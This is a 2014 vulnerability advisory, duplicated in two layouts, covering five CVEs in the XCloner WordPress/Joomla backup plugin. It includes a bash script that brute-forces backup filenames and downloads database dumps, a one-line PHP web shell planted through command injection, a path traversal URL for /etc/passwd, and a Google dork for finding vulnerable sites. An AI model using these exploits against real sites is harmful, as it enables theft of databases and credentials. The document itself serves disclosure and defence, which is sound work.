=== Content from www.vapid.dhs.org_e07fd711_20250125_203129.html ===

## Title: XCloner Wordpress/Joomla! backup Plugin v3.1.1 (Wordpress) v3.5.1 (Joomla!) Vulnerabilities

Author: Larry W. Cashdollar, @\_larry0

Date: 10/17/2014

Download: [https://wordpress.org/plugins/xcloner-backup-and-restore/](https://www.google.com/url?q=https%3A%2F%2Fwordpress.org%2Fplugins%2Fxcloner-backup-and-restore%2F&sa=D&sntz=1&usg=AFQjCNHq_XyoESfBqR0sWXoGJooqR5Hq3w)

Download: [http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665](http://www.google.com/url?q=http%3A%2F%2Fextensions.joomla.org%2Fextensions%2Faccess-a-security%2Fsite-security%2Fbackup%2F665&sa=D&sntz=1&usg=AFQjCNH3Pzew95S6UDTfrjh9ledcHrQL0g)

Downloads: Wordpress 313,647 Joomla! 515745 StandAlone 69175

Website: http://www.xcloner.com

Advisory: [http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/](http://www.google.com/url?q=http%3A%2F%2Fwww.vapid.dhs.org%2Fadvisories%2Fwordpress%2Fplugins%2FXclonerv3-2%2F&sa=D&sntz=1&usg=AFQjCNHVAd8w4LBTIDwUWhC2Xvg3S3bMzg)

Vendor: Notified 10/17/14 Ovidiu Liuta, [@thinkovi](https://www.google.com/url?q=https%3A%2F%2Ftwitter.com%2Fthinkovi&sa=D&sntz=1&usg=AFQjCNGZX96yIh3xMiM8oDpJJdsWPlOoUw) Acknowledged & no other response.

CVEIDs: 2014-8603,2014-8604,2014-8605,2014-8606,2014-8607

OSVDBID: 114176,114177,114178,114179,114180

Description: “XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.”

Vulnerabilities:  There are multiple vulnerabilities I’ve discovered in this plugin, they are as follows.

1. Arbitrary command execution.
2. Clear text MySQL password exposure through html text box under configuration panel.
3. Database backups exposed to local users due to open file permissions.
4. Unauthenticated remote access to backup files via easily guessable file names.
5. Authenticated remote file access.
6. MySQL password exposed to process table.

Arbitrary Command Execution

Plugin allows arbitrary commands to be executed by an authenticated user.  The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields.

PoC

All input fields I believe are vulnerable, I’ve chosen the backup filename and a wget of sh.txt which is simply <?php passthru($\_GET)?> into a writeable directory by www-data.

![Screen Shot 2014-10-17 at 9.11.34 PM.png](images/image03.png)

![Screen Shot 2014-10-17 at 9.19.39 PM.png](images/image01.png)

![Screen Shot 2014-10-17 at 9.12.19 PM.png](images/image04.png)

All user configurable variables are vulnerable, these variables need to be sanitized before being passed to the exec() function for execution.

$\_CONFIG[tarpath]

$exclude

$\_CONFIG['tarcompress']

$\_CONFIG['filename']

$\_CONFIG['exfile\_tar']

$\_CONFIG[sqldump]

$\_CONFIG['mysql\_host']

$\_CONFIG['mysql\_pass']

$\_CONFIG['mysql\_user']

$database\_name

$sqlfile

$filename

Vulnerable code

./cloner.functions.php:

1672       exec($\_CONFIG[tarpath] . " $exclude -c" . $\_CONFIG['tarcompress'] . "vf $filename ./administrator/backups/index.html");

1673       exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/database-sql.sql");

1674       exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/htaccess.txt");

1675       exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/perm.txt");

1695-          if ($\_REQUEST[cron\_dbonly] != 1) {

1696:              exec($\_CONFIG[tarpath] . " $excl\_cmd " . " -X " . $\_CONFIG['exfile\_tar'] . "  -chv" . $\_CONFIG['tarcompress'] . "f $filename ./");

1697-          } else {

1698-

1699-

1700:      exec($\_CONFIG[tarpath] . "  -" . $\_CONFIG['tarcompress'] . "cvf $filename ./administrator/backups/database-sql.sql");

1701-

1702-              if (is\_array($databases\_incl)) {

1703-                  foreach ($databases\_incl as $database\_name)

1704-                      if ($database\_name != "") {

1705:                          exec($\_CONFIG[tarpath] . "  -" . $\_CONFIG['tarcompress'] . "vf $filename --update  ./administrator/backups/" . $database\_name . "-sql.sql");

1706-                      }

1707-              }

1708-          }

--

1873-  {

1874-      //$sizeInBytes = filesize($path);

1875-      $sizeInBytes = sprintf("%u", filesize($path));

1876:      if ((!$sizeInBytes) and (function\_exists("exec"))){

1877-          $command = "ls -l \"$path\" | cut -d \" \" -f 5";

1878:          $sizeInBytes = @exec($command);

1879-      }

2010-      if ($\_CONFIG['sql\_mem']) {

2011:          exec($\_CONFIG[sqldump] . " -h " . $\_CONFIG['mysql\_host'] . " -u " . $\_CONFIG['mysql\_user'] . " -p" . $\_CONFIG['mysql\_pass'] . " " . $dbname . " > " . $sqlfile . " $drop --allow-k

eywords " . $ex\_dump);

2012-

2013-          if (get\_filesize($sqlfile) > 0)

2014-              $databaseResult = LM\_DATABASE\_BACKUP\_COMPLETED . ' ( ' . getFileSizeText(get\_filesize($sqlfile)) . ' )';

2015-          else

2016-              $databaseResult = LM\_MSG\_BACK\_14;

2017-

2018:          exec("chmod 777 $sqlfile");

2019-

2020-          return $sqlfile;

2021-      }

./classes/fileRecursion.php

339-    public static function getFileSize($file){

340-

341-      $sizeInBytes = sprintf("%u", filesize($file));

342:      if ((!$sizeInBytes) and (function\_exists("exec"))){

343-          $command = "ls -l \"$file\" | cut -d \" \" -f 5";

344:          $sizeInBytes = @exec($command);

345-      }

346-

347-      return $sizeInBytes;

./restore/XCloner.php

290-    }else{

291-            if($ext == '.tgz') $compress = 'z';

292-            else $compress = '';

293:            shell\_exec("tar -x".$compress."pf $file -C $\_CONFIG[output\_path]");

294-    }

295-}

1077-   if($\_REQUEST['use\_mysqldump'] == 1){

1078:           echo shell\_exec($\_REQUEST['mysqldump\_path']." -u ".$\_REQUEST[mysql\_username]." -p".$\_REQUEST[mysql\_pass]." -h ".$\_REQUEST[mysql\_server]." ".$\_REQUEST[mysql\_db]." < ".$sqlfile);

1079-           return;

1080-    }

Clear Text MySQL Database Password

The plugin also returns the MySQL clear text password via html text box back to the user in the configuration panel.  A password should never be repeated back to you in clear text.  The plugin will happily send this over a clear text connection.

![Screen Shot 2014-10-17 at 9.14.04 PM.png](images/image02.png)

Remote Database Download & Local File Permissions

The default recommend path for backup storage is /usr/share/wordpress/administrator/backups.

An index.html file is created under this directory to prevent casual browsing however the file names are easily predictable. From the installation instructions:

“XCloner is a tool that will help you manage your website backups, generate/restore/move so your website will be always secured! With XCloner you will be able to clone your site to any other location with just a few clicks. Don't forget to create the 'administrator/backups' directory in your Wordpress root and make it fully writeable.”

The format of the filenames are: backup\_year-month-day\_month\_24hour\_minute\_domainname-sql-OPTIONS.tar where

OPTIONS could be either -sql-drop, -sql-nodrop or -nosql depending on options selected during time of backup.

The domain name is set by the HTTP\_HOST header from line 88 of  cloner.config.php:

88: $\_CONFIG['mosConfig\_live\_site']=$\_SERVER['HTTP\_HOST'];

root@larry:/usr/share/wordpress/administrator/backups# ls -l

total 129432

-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:15 backup\_2014-10-29\_10-14\_testsite-sql-nodrop.tar

-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:19 backup\_2014-10-29\_10-19\_testsite-sql-nodrop.tar

-rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:24 backup\_2014-10-29\_10-24\_testsite-sql-nodrop.tar

These file permissions also expose the contents of the databases to any local system users.

File naming convention code is as follows:

   1327       $domainname = $\_CONFIG['mosConfig\_live\_site'];

   1351       if ($\_REQUEST['bname'] == "") {

   1352           if ($backupDatabase == 1) {

   1353               if ($\_REQUEST['dbbackup\_drop']) {

   1354                   $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-sql-drop' . $f\_ext;

   1355               } else {

   1356

   1357                   $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-sql-nodrop' . $f\_ext;

   1358               }

   1359           } else

   1360               $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-nosql' . $f\_ext;

   1361       } else {

![snapshot3.png](images/image00.png)

I’ve found a few vulnerable websites with the google dork:

<https://www.google.com/#q=inurl:+administrator%2Fbackups>

A PoC:

lwc@wordpress:~$ bash exp.sh 192.168.0.26

[+] Location http://192.168.0.26/administrator/backups/backup\_2014-10-30\_06-27\_-sql-nodrop.tar Found

[+] Received HTTP/1.1 200 OK

Downloading......

--2014-10-30 13:02:51--  http://192.168.0.26/administrator/backups/backup\_2014-10-30\_06-27\_-sql-nodrop.tar

Connecting to 192.168.0.26:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 44400640 (42M) [application/x-tar]

Saving to: `backup\_2014-10-30\_06-27\_-sql-nodrop.tar.1'

100%[========================================>] 44,400,640  56.9M/s   in 0.7s

2014-10-30 13:02:52 (56.9 MB/s) - `backup\_2014-10-30\_06-27\_-sql-nodrop.tar.1' saved [44400640/44400640]

[+] Location http://192.168.0.26/administrator/backups/backup\_2014-10-30\_06-33\_-sql-nodrop.tar Found

[+] Received HTTP/1.1 200 OK

Downloading......

--2014-10-30 13:02:52--  http://192.168.0.26/administrator/backups/backup\_2014-10-30\_06-33\_-sql-nodrop.tar

Connecting to 192.168.0.26:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 44400640 (42M) [application/x-tar]

Saving to: `backup\_2014-10-30\_06-33\_-sql-nodrop.tar.1'

100%[========================================>] 44,400,640  64.1M/s   in 0.7s

2014-10-30 13:02:53 (64.1 MB/s) - `backup\_2014-10-30\_06-33\_-sql-nodrop.tar.1' saved [44400640/44400640]

#!/bin/bash

#Exploit to download XCloner v3.1.1 Database backups

#Larry W. Cashdollar, @\_larry0

#XCloner recommends a backup storage path under the WP root directory

#it uses a 0 size index.html file to block indexing.

#we can try to brute force the filenames it creates.

MONTH=10

DAY=30

#May need to set the DOMAIN to $1 the target depending on how WP is configured.

DOMAIN=

for y in `seq -w 1 24`; do

        for x in `seq -w 1 59`; do

                CPATH="http://$1/administrator/backups/backup\_2014-"$MONTH"-"$DAY"\_"$y"-"$x"\_$DOMAIN-sql-nodrop.tar";

                 RESULT=`curl -s --head $CPATH|grep 200`;

                if [ -n "$RESULT" ]; then

                 echo "[+] Location $CPATH Found";

                 echo "[+] Received $RESULT";

                 echo "Downloading......";

                 wget $CPATH

                fi;

        done

done

Remote File Access

The user has to have administrative rights, but the backup downloader doesn’t check the path

for ../.

[http://192.168.0.33/wp-admin/admin-ajax.php?action=json\_return&page=xcloner\_show&option=com\_cloner&task=download&file=../../../../etc/passwd](http://www.google.com/url?q=http%3A%2F%2F192.168.0.33%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Djson_return%26page%3Dxcloner_show%26option%3Dcom_cloner%26task%3Ddownload%26file%3D..%2F..%2F..%2F..%2Fetc%2Fpasswd&sa=D&sntz=1&usg=AFQjCNEyJ9edE6xzk6VOBAi35gqpB5S6Gg)

Will download /etc/passwd off the remote system.

MySQL Database Password Exposed to Process Table

lwc@wordpress:/etc/wordpress$ while (true); do ps -ef |grep [m]ysqldump; done

www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -pPASSWORDHERE wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords

www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords

www-data 16691  8889  0 09:27 ?        00:00:00 sh -c mysqldump --quote-names  -h localhost -u root -ps3cur1ty wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql  --allow-keywords

www-data 16692 16691  0 09:27 ?        00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords

^C



=== Content from www.vapid.dhs.org_47f901e5_20250125_203129.html ===


| Advisory #: 110 |
| --- |
| **Title:** XCloner Backup Plugin v3.1.1 (Wordpress) v3.5.1 (Joomla!) Vulnerabilities |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2014-10-17 |
| [[CVE-2014-8603](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8603)][[CVE-2014-8604](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8604)][[CVE-2014-8605](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8605)][[CVE-2014-8606](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8606)][[CVE-2014-8607](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8607)] |
| **Download Site:** [https://wordpress.org/plugins/xcloner-backup-and-restore/ http://extensions.joomla.org/extensions/access-a-security/site-security/backup/665](https://wordpress.org/plugins/xcloner-backup-and-restore/%20http%3A//extensions.joomla.org/extensions/access-a-security/site-security/backup/665) |
| **Vendor:** |
| **Vendor Notified:**  2014-10-17 |
| **Vendor Contact:** Ovidiu Liuta, @thinkovi Acknowledged & no other response |
| **Advisory:** <http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/>http://www.vapid.dhs.org/advisories/wordpress/plugins/Xcloner-v3.1.1/ |
| **Description:** XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!. |
| **Vulnerability:**There are multiple vulnerabilities I’ve discovered in this plugin, they are as follows. Arbitrary command execution: Clear text MySQL password exposure through html text box under configuration panel. Database backups exposed to local users due to open file permissions. Unauthenticated remote access to backup files via easily guessable file names. Authenticated remote file access. MySQL password exposed to process table: Arbitrary Command Execution Plugin allows arbitrary commands to be executed by an authenticated user. The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields. All user configurable variables are vulnerable, these variables need to be sanitized before being passed to the exec() function for execution. $\_CONFIG[tarpath] $exclude $\_CONFIG['tarcompress'] $\_CONFIG['filename'] $\_CONFIG['exfile\_tar'] $\_CONFIG[sqldump] $\_CONFIG['mysql\_host'] $\_CONFIG['mysql\_pass'] $\_CONFIG['mysql\_user'] $database\_name $sqlfile $filename Vulnerable code ./cloner.functions.php: 1672 exec($\_CONFIG[tarpath] . " $exclude -c" . $\_CONFIG['tarcompress'] . "vf $filename ./administrator/backups/index.html"); 1673 exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/database-sql.sql"); 1674 exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/htaccess.txt"); 1675 exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/perm.txt"); 1695- if ($\_REQUEST[cron\_dbonly] != 1) { 1696: exec($\_CONFIG[tarpath] . " $excl\_cmd " . " -X " . $\_CONFIG['exfile\_tar'] . " -chv" . $\_CONFIG['tarcompress'] . "f $filename ./"); 1697- } else { 1698- 1699- 1700: exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "cvf $filename ./administrator/backups/database-sql.sql"); 1701- 1702- if (is\_array($databases\_incl)) { 1703- foreach ($databases\_incl as $database\_name) 1704- if ($database\_name != "") { 1705: exec($\_CONFIG[tarpath] . " -" . $\_CONFIG['tarcompress'] . "vf $filename --update ./administrator/backups/" . $database\_name . "-sql.sql"); 1706- } 1707- } 1708- } -- 1873- { 1874- //$sizeInBytes = filesize($path); 1875- $sizeInBytes = sprintf("%u", filesize($path)); 1876: if ((!$sizeInBytes) and (function\_exists("exec"))){ 1877- $command = "ls -l \"$path\" | cut -d \" \" -f 5"; 1878: $sizeInBytes = @exec($command); 1879- } 2010- if ($\_CONFIG['sql\_mem']) { 2011: exec($\_CONFIG[sqldump] . " -h " . $\_CONFIG['mysql\_host'] . " -u " . $\_CONFIG['mysql\_user'] . " -p" . $\_CONFIG['mysql\_pass'] . " " . $dbname . " > " . $sqlfile . " $drop --allow-k eywords " . $ex\_dump); 2012- 2013- if (get\_filesize($sqlfile) > 0) 2014- $databaseResult = LM\_DATABASE\_BACKUP\_COMPLETED . ' ( ' . getFileSizeText(get\_filesize($sqlfile)) . ' )'; 2015- else 2016- $databaseResult = LM\_MSG\_BACK\_14; 2017- 2018: exec("chmod 777 $sqlfile"); 2019- 2020- return $sqlfile; 2021- } ./classes/fileRecursion.php 339- public static function getFileSize($file){ 340- 341- $sizeInBytes = sprintf("%u", filesize($file)); 342: if ((!$sizeInBytes) and (function\_exists("exec"))){ 343- $command = "ls -l \"$file\" | cut -d \" \" -f 5"; 344: $sizeInBytes = @exec($command); 345- } 346- 347- return $sizeInBytes; ./restore/XCloner.php 290- }else{ 291- if($ext == '.tgz') $compress = 'z'; 292- else $compress = ''; 293: shell\_exec("tar -x".$compress."pf $file -C $\_CONFIG[output\_path]"); 294- } 295-} 1077- if($\_REQUEST['use\_mysqldump'] == 1){ 1078: echo shell\_exec($\_REQUEST['mysqldump\_path']." -u ".$\_REQUEST[mysql\_username]." -p".$\_REQUEST[mysql\_pass]." -h ".$\_REQUEST[mysql\_server]." ".$\_REQUEST[mysql\_db]." < ".$sqlfile); 1079- return; 1080- } Clear Text MySQL Database Password The plugin also returns the MySQL clear text password via html text box back to the user in the configuration panel. A password should never be repeated back to you in clear text. The plugin will happily send this over a clear text connection. Remote Database Download & Local File Permissions The default recommend path for backup storage is /usr/share/wordpress/administrator/backups. An index.html file is created under this directory to prevent casual browsing however the file names are easily predictable. From the installation instructions: “XCloner is a tool that will help you manage your website backups, generate/restore/move so your website will be always secured! With XCloner you will be able to clone your site to any other location with just a few clicks. Don't forget to create the 'administrator/backups' directory in your Wordpress root and make it fully writeable.” The format of the filenames are: backup\_year-month-day\_month\_24hour\_minute\_domainname-sql-OPTIONS.tar where OPTIONS could be either -sql-drop, -sql-nodrop or -nosql depending on options selected during time of backup. The domain name is set by the HTTP\_HOST header from line 88 of cloner.config.php: 88: $\_CONFIG['mosConfig\_live\_site']=$\_SERVER['HTTP\_HOST']; root@larry:/usr/share/wordpress/administrator/backups# ls -l total 129432 -rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:15 backup\_2014-10-29\_10-14\_testsite-sql-nodrop.tar -rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:19 backup\_2014-10-29\_10-19\_testsite-sql-nodrop.tar -rw-r--r-- 1 www-data www-data 44177408 Oct 29 13:24 backup\_2014-10-29\_10-24\_testsite-sql-nodrop.tar These file permissions also expose the contents of the databases to any local system users. File naming convention code is as follows: 1327 $domainname = $\_CONFIG['mosConfig\_live\_site']; 1351 if ($\_REQUEST['bname'] == "") { 1352 if ($backupDatabase == 1) { 1353 if ($\_REQUEST['dbbackup\_drop']) { 1354 $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-sql-drop' . $f\_ext; 1355 } else { 1356 1357 $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-sql-nodrop' . $f\_ext; 1358 } 1359 } else 1360 $filename1 = 'backup\_' . date("Y-m-d\_H-i") . '\_' . $domainname . '-nosql' . $f\_ext; 1361 } else { I’ve found a few vulnerable websites with the google dork: https://www.google.com/#q=inurl:+administrator%2Fbackups Remote File Access The user has to have administrative rights, but the backup downloader doesn’t check the path for ../. http://192.168.0.33/wp-admin/admin-ajax.php?action=json\_return&page=xcloner\_show&option=com\_cloner&task=download&file=../../../../etc/passwd Will download /etc/passwd off the remote system. MySQL Database Password Exposed to Process Table lwc@wordpress:/etc/wordpress$ while (true); do ps -ef |grep [m]ysqldump; done www-data 16691 8889 0 09:27 ? 00:00:00 sh -c mysqldump --quote-names -h localhost -u root -pPASSWORDHERE wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql --allow-keywords www-data 16692 16691 0 09:27 ? 00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords www-data 16691 8889 0 09:27 ? 00:00:00 sh -c mysqldump --quote-names -h localhost -u root -ps3cur1ty wordpress > /usr/share/wordpress/administrator/backups/database-sql.sql --allow-keywords www-data 16692 16691 0 09:27 ? 00:00:00 mysqldump --quote-names -h localhost -u root -px xxxxxx wordpress --allow-keywords |
| **Export:** [JSON](export_json.py?id=) [TEXT](txt/.txt) [XML](xml.php?s=) |
| **Exploit Code:** ```   1. All input fields I believe are vulnerable, I’ve chosen the backup filename and a wget of sh.txt which is simply <?php [passthru](http://www.php.net/passthru)($_GET)?> into a writeable directory by www-data. 3. #!/bin/bash 4. #Exploit to download XCloner v3.1.1 Database backups 5. #Larry W. Cashdollar, @_larry0 6. #XCloner recommends a backup storage path under the WP root directory 7. #it uses a 0 size index.html file to block indexing. 8. #we can try to brute force the filenames it creates. 9. MONTH=10 10. DAY=30 11. #May need to set the DOMAIN to $1 the target depending on how WP is configured. 12. DOMAIN= 13. for y in `seq -w 1 24`; do 14. for x in `seq -w 1 59`; do 15. CPATH="http://$1/administrator/backups/backup_2014-"$MONTH"-"$DAY"_"$y"-"$x"_$DOMAIN-sql-nodrop.tar"; 16. RESULT=`curl -s --head $CPATH|grep 200`; 17. if [ -n "$RESULT" ]; then 18. echo "[+] Location $CPATH Found"; 19. echo "[+] Received $RESULT"; 20. echo "Downloading......"; 21. wget $CPATH 22. fi; 23. done 24. done 26. lwc@wordpress:~$ bash exp.sh 192.168.0.26 27. [+] Location http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar Found 28. [+] Received HTTP/1.1 200 OK 29. Downloading...... 30. --2014-10-30 13:02:51--  http://192.168.0.26/administrator/backups/backup_2014-10-30_06-27_-sql-nodrop.tar 31. Connecting to 192.168.0.26:80... connected. 32. HTTP request sent, awaiting response... 200 OK 33. Length: 44400640 (42M) [application/x-tar] 34. Saving to: `backup_2014-10-30_06-27_-sql-nodrop.tar.1' 35. 100%[========================================>] 44,400,640  56.9M/s   in 0.7s 36. 2014-10-30 13:02:52 (56.9 MB/s) - `backup_2014-10-30_06-27_-sql-nodrop.tar.1' saved [44400640/44400640] 37. [+] Location http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar Found 38. [+] Received HTTP/1.1 200 OK 39. Downloading...... 40. --2014-10-30 13:02:52--  http://192.168.0.26/administrator/backups/backup_2014-10-30_06-33_-sql-nodrop.tar 41. Connecting to 192.168.0.26:80... connected. 42. HTTP request sent, awaiting response... 200 OK 43. Length: 44400640 (42M) [application/x-tar] 44. Saving to: `backup_2014-10-30_06-33_-sql-nodrop.tar.1' 45. 100%[========================================>] 44,400,640  64.1M/s   in 0.7s 46. 2014-10-30 13:02:53 (64.1 MB/s) - `backup_2014-10-30_06-33_-sql-nodrop.tar.1' saved [44400640/44400640]  ``` |
| **Screen Shots:** [[image03.png](/m/image03.png)][[image01.png](/m/image01.png)][[image02.png](/m/image02.png)][[image00.png](/m/image00.png)] |
| **Notes:** 114176 114177 114178 114179 114180 |


